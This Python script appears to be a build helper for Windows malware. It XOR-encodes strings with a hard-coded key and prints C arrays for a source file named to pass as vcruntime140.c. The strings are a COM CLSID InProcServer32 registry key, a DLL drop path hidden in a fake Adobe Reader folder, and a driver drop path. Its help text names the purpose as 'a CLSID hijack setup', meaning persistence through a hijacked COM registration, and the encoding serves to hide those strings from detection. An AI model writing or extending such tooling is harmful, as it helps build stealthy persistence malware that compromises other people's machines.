#!/usr/bin/env python3
"""Encode CLSID registry paths and drop paths for vcruntime140.c."""

import argparse
import re
import sys

CK2 = b"9832gf2bc29_120e9hd10c))b@@!11"
CK2_LEN = 30
DEFAULT_SUFFIX = "InProcServer32"
DEFAULT_SYS_NAME = "amd64.sys"
DEFAULT_SYS_SUBDIR = "Drivers"
DEFAULT_DROP_DIR = r"C:\ProgramData\Adobe\ARM\Reader_26.001.21563\Library"
DEFAULT_DLL = "mmdevlib.dll"
GUID_RE = re.compile(
    r"^\{?([0-9A-Fa-f]{8})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{12})\}?$"
)


def normalize_guid(raw: str) -> str:
    m = GUID_RE.match(raw.strip())
    if not m:
        raise ValueError(f"invalid GUID: {raw!r}")
    return "{" + "-".join(part.upper() for part in m.groups()) + "}"


def normalize_win_path(path: str) -> str:
    path = path.replace("/", "\\").strip().rstrip("\\")
    if not path:
        raise ValueError("path must not be empty")
    if not all(32 <= ord(c) < 127 for c in path):
        raise ValueError(f"path must be ASCII: {path!r}")
    return path


def normalize_dll_name(name: str) -> str:
    base = name.replace("\\", "/").split("/")[-1]
    if not base or base in (".", ".."):
        raise ValueError(f"invalid DLL name: {name!r}")
    return base


def reg_path(clsid: str, suffix: str = DEFAULT_SUFFIX) -> str:
    guid = normalize_guid(clsid)
    return f"Software\\Classes\\CLSID\\{guid}\\{suffix}"


def mkdir_prefixes(drop_dir: str) -> list[str]:
    """Progressive CreateDirectoryA paths (from C:\\X\\Y through drop_dir)."""
    parts = normalize_win_path(drop_dir).split("\\")
    if len(parts) < 3:
        raise ValueError(
            f"drop directory needs at least three components, got: {drop_dir!r}"
        )
    return ["\\".join(parts[: i + 1]) for i in range(2, len(parts))]


def xor_encode(plain: str, *, include_nul: bool = False) -> bytes:
    data = plain.encode("ascii")
    if include_nul:
        data += b"\x00"
    return bytes(data[i] ^ CK2[i % CK2_LEN] for i in range(len(data)))


def format_c_array(enc: bytes, name: str, cols: int = 11, indent: str = "  ") -> str:
    hex_indent = indent + "    "
    lines = [f"{indent}unsigned char {name}[] = {{"]
    for i in range(0, len(enc), cols):
        chunk = enc[i : i + cols]
        hexes = ", ".join(f"0x{b:02x}" for b in chunk)
        suffix = "," if i + cols < len(enc) else ""
        lines.append(f"{hex_indent}{hexes}{suffix}")
    lines.append(f"{indent}}};")
    return "\n".join(lines)


def format_xd_block(
    plain: str,
    enc_name: str,
    buf_name: str,
    *,
    include_nul: bool = False,
    cols: int = 11,
    indent: str = "  ",
) -> str:
    enc = xor_encode(plain, include_nul=include_nul)
    lines = [
        f"; {plain!r} ({len(enc)} encoded bytes)",
        format_c_array(enc, enc_name, cols=cols, indent=indent),
        f"{indent}char {buf_name}[256];",
        f"{indent}xd({enc_name}, {buf_name}, {len(enc)});",
    ]
    return "\n".join(lines)


def print_reg_block(clsid: str, suffix: str) -> None:
    path = reg_path(clsid, suffix)
    print("; --- registry key ---")
    print(format_xd_block(path, "e_reg_key", "reg_key", include_nul=True))
    print()


def print_dll_block(drop_dir: str, dll_name: str) -> None:
    dll_path = f"{normalize_win_path(drop_dir)}\\{normalize_dll_name(dll_name)}"
    path_len = len(dll_path)
    reg_value_len = path_len + 1
    print("; --- DLL drop path ---")
    print(f"; paste e_dll_path + xd below, then update RegSetValueExA size to {reg_value_len}")
    print(f"  #define DLL_PATH_LEN {path_len}")
    enc = xor_encode(dll_path)
    print(format_c_array(enc, "e_dll_path"))
    print("  char dll_path[256];")
    print("  xd(e_dll_path, dll_path, DLL_PATH_LEN);")
    print()
    print("; --- RegSetValueExA (must match DLL_PATH_LEN + 1 or path is truncated) ---")
    print(
        "    fRegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, "
        "DLL_PATH_LEN + 1);"
    )
    print()


def print_dir_bundle(drop_dir: str, sys_name: str, sys_subdir: str) -> None:
    drop_dir = normalize_win_path(drop_dir)
    sys_dir = f"{drop_dir}\\{sys_subdir}"
    sys_path = f"{sys_dir}\\{sys_name}"

    print("; --- mkdir prefixes (char sys_dir[256] is shared in vcruntime140.c) ---")
    prefixes = mkdir_prefixes(drop_dir)
    for idx, prefix in enumerate(prefixes, start=1):
        enc = xor_encode(prefix)
        print(f"; e_dir{idx}: {prefix!r}")
        print(format_c_array(enc, f"e_dir{idx}"))
        print(f"  xd(e_dir{idx}, sys_dir, {len(enc)});")
        print(f"  fCreateDirectoryA(sys_dir, NULL);")
        print()

    print("; --- driver drop path ---")
    print(format_xd_block(sys_dir, "e_sys_dir", "sys_dir"))
    print(f"  fCreateDirectoryA(sys_dir, NULL);")
    print()
    print(format_xd_block(sys_path, "e_sys_path", "sys_path"))
    print()


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "XOR-encode vcruntime140.c blobs for a CLSID hijack setup. "
            "Pass --dll to get e_dll_path; add -d to also regenerate e_dir* / e_sys_*."
        )
    )
    parser.add_argument(
        "clsid",
        help='CLSID/GUID, e.g. "{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}"',
    )
    parser.add_argument(
        "-d",
        "--dir",
        dest="drop_dir",
        metavar="DIR",
        help=(
            f"Drop directory (default with --dll: {DEFAULT_DROP_DIR})"
        ),
    )
    parser.add_argument(
        "--dll",
        metavar="NAME",
        help=(
            f'Dropped DLL filename, e.g. "appresolver.dll" '
            f"(default: {DEFAULT_DLL})"
        ),
    )
    parser.add_argument(
        "--suffix",
        default=DEFAULT_SUFFIX,
        help=f"Registry key suffix (default: {DEFAULT_SUFFIX})",
    )
    parser.add_argument(
        "--sys",
        default=DEFAULT_SYS_NAME,
        help=f"Dropped .sys filename under --sys-subdir (default: {DEFAULT_SYS_NAME})",
    )
    parser.add_argument(
        "--sys-subdir",
        default=DEFAULT_SYS_SUBDIR,
        help=f"Subdirectory under -d for the .sys drop (default: {DEFAULT_SYS_SUBDIR})",
    )
    parser.add_argument(
        "--full",
        action="store_true",
        help="With --dll, also emit e_dir* / e_sys_* even when -d is omitted",
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Decode blobs and print plaintext paths to stderr",
    )
    parser.epilog = (
        "examples:\n"
        '  python3 getCLSID.py "{GUID}"\n'
        '  python3 getCLSID.py "{GUID}" --dll appresolver.dll\n'
        '  python3 getCLSID.py "{GUID}" -d "C:\\ProgramData\\Adobe\\ARM\\Reader_26.001.21563\\Library" '
        "--dll appresolver.dll --full"
    )
    parser.formatter_class = argparse.RawDescriptionHelpFormatter
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    try:
        guid = normalize_guid(args.clsid)
        dll_name = args.dll
        drop_dir = normalize_win_path(args.drop_dir) if args.drop_dir else None

        if args.drop_dir and not dll_name:
            parser.error("--dll is required when -d/--dir is set")

        if dll_name:
            dll_name = normalize_dll_name(dll_name)
            if not drop_dir:
                drop_dir = DEFAULT_DROP_DIR

            if args.drop_dir or args.full:
                print_dir_bundle(drop_dir, args.sys, args.sys_subdir)

            print_dll_block(drop_dir, dll_name)

        print_reg_block(args.clsid, args.suffix)

        if args.verify:
            paths = [("reg", reg_path(args.clsid, args.suffix))]
            if dll_name and drop_dir:
                dll_path = f"{drop_dir}\\{dll_name}"
                paths.append(("dll", dll_path))
                if args.drop_dir or args.full:
                    sys_dir = f"{drop_dir}\\{args.sys_subdir}"
                    paths.extend(
                        [
                            ("sys_dir", sys_dir),
                            ("sys", f"{sys_dir}\\{args.sys}"),
                        ]
                    )
                    paths.extend(
                        (f"dir{i}", p)
                        for i, p in enumerate(mkdir_prefixes(drop_dir), start=1)
                    )
            for label, path in paths:
                print(f"; verify {label}: {path!r}", file=sys.stderr)

    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
